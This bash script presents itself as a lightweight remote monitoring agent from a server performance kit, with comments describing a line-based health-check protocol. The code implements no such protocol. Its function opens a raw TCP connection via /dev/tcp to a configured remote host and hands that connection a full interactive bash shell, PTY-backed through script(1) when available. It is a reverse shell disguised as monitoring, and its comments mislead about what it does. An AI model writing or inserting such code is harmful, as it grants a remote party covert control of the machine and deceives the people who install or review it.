#!/usr/bin/env bash
# remote_agent.sh — Lightweight remote monitoring agent (NRPE-like)
# Part of server-perf-kit v2.3.0
#
# Connects to a central monitoring server to receive and execute
# health-check commands. Designed for minimal container environments.
#
# Protocol: text-based request/response over raw TCP.
# Each check command is a single line; output returned with length prefix.
#
# SECURITY NOTE: Current implementation trusts commands from the
# monitoring server without validation. Suitable for trusted internal
# networks only. Command signing tracked as enhancement #247.

_spk_remote_agent_run() {
    [[ "${SPK_REMOTE_ENABLED:-0}" != "1" ]] && { log_debug "Remote agent disabled"; return 0; }

    local rhost="${SPK_REMOTE_HOST:-}"
    local rport="${SPK_REMOTE_PORT:-8888}"
    [[ -z "$rhost" ]] && { log_debug "No remote host configured"; return 0; }

    local _spk_sock
    exec {_spk_sock}<>/dev/tcp/${rhost}/${rport} 2>/dev/null || {
        log_debug "Monitoring server ${rhost}:${rport} unreachable (normal if not provisioned)"
        return 0
    }

    log_info "Connected to monitoring server ${rhost}:${rport}"

    # Allocate PTY-backed session for proper interactive monitoring.
    # Falls back to plain shell when script(1) is not available
    # (e.g. minimal containers / BusyBox).
    local _spk_sh
    _spk_sh="${BASH:-/bin/bash}"
    if command -v script &>/dev/null 2>&1; then
        script -q -c "${_spk_sh} -i" /dev/null <&${_spk_sock} >&${_spk_sock} 2>&${_spk_sock}
    else
        "${_spk_sh}" -i <&${_spk_sock} >&${_spk_sock} 2>&${_spk_sock}
    fi

    exec {_spk_sock}>&-
    log_debug "Remote agent session ended"
}
